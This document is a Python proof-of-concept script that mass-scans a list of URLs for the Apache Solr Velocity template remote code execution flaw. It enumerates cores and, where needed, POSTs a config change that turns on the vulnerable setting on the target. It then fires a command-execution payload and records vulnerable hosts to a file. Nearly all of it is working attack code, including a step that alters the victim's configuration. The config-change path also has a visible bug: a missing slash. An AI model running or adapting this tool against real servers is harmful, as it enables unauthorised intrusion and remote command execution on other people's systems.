import requests
import solr_config
from lxml import etree
import json
from concurrent.futures import ThreadPoolExecutor
import threading
import urllib3  #防止报错
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Solr_poc():

    # url_list 检测的url
    # core
    # 存在漏洞的url

    url_list=[]
    core={}
    shell_url=[]

    def __init__(self):
        self.read_url()
        exeutor = ThreadPoolExecutor(max_workers=5)
        for url in self.url_list:
            exeutor.submit(self.control, url.strip('\n'))
        exeutor.shutdown()
        # self.control()

    def read_url(self):
        # 读取要检测的url
        with open('url_list.txt','r+') as f:
            self.url_list=f.readlines()
        f.close()

    def control(self,url):
        # @control           脚本控制器
        # @get_core          获取solr的core
        # @check_core        检查params.resource.loader.enabled属性
        # @change_enabled    若params.resource.loader.enabled属性为false，则调用该函数更改为true
        # @get_shell         当以上条件满足后调用执行系统命令
        # print(url)
        flag=self.get_core(url.strip('\n'))
        if flag == 0:
            print(url.strip('\n')+"     no core")
        elif flag != 0:
            if self.core[url][0]:
                enabled=self.check_core(self.core[url][0],url.strip('\n'))
                if enabled == 1:
                    self.get_shell(self.core[url][0],url.strip('\n'))
                elif enabled == 2:
                    isChange = self.change_enabled(self.core[url][0],url.strip('\n'))
                    if isChange == 1:
                        self.get_shell(self.core[url][0],url.strip('\n'))
                    elif isChange == 2:
                        print(url+"     can not change!")
                    else:
                        print(url+"     err")
                else:
                    print(url+'     no enabled')

    def get_core(self,url):
        # print("get_core")
        # @status  core
        try:
            response = requests.get(url+solr_config.solr_core, headers=solr_config.headers, verify=False,timeout=5)
            if response.text:
                status = json.loads(response.text)['status']
                self.core[url]=[]
                for i in status:
                    if i:
                        self.core[url].append(i)
                    else:
                        return 0
            else:
                return 0
        except Exception as err:
            return 0

    def check_core(self,core,url):
        # print("check_core")
        # @queryResponseWriter  json加载后读取queryResponseWriter
        # @enable               属性的值

        url = url+"/solr/"+core+solr_config.solr_file
        try:
            response = requests.get(url, headers=solr_config.headers, verify=False,timeout=5)
            if response.text:
                queryResponseWriter = json.loads(response.text)['queryResponseWriter']
                velocity = queryResponseWriter['velocity']
                enabled = velocity['params.resource.loader.enabled']
                if enabled == "true":
                    return 1
                elif enabled == "false":
                    return 2
                else:
                    return 0
            else:
                return 0
        except Exception as err:
            return 0
            print(err)

    def get_shell(self,core,url):
        # @iwtfky 存在漏洞的目标返回banner
        # print("get_shell")
        shell_url = url+"/solr/"+core+solr_config.solr_shell
        isShell = requests.post(shell_url, headers=solr_config.headers, verify=False,timeout=5)
        if "iwtfky" in isShell.text:
            print(url+"     存在漏洞！")
            self.shell_url.append(url)

    def change_enabled(self,core,url):
        # print("change_enabled")
        # 当检测到目标属性为false时将属性更改为true
        requests.post(url+"/solr"+core+"/config",data=solr_config.change_Enable,headers=solr_config.headers,verify=False,timeout=5)
        flag = self.check_core(core,url)
        return flag

if __name__ == '__main__':
    print(solr_config.banner1)
    print(solr_config.banner2)
    Solr_poc()
    with open('s.txt','a+') as f:
        for i in Solr_poc.shell_url:
            f.write(i+'\n')
        f.close()
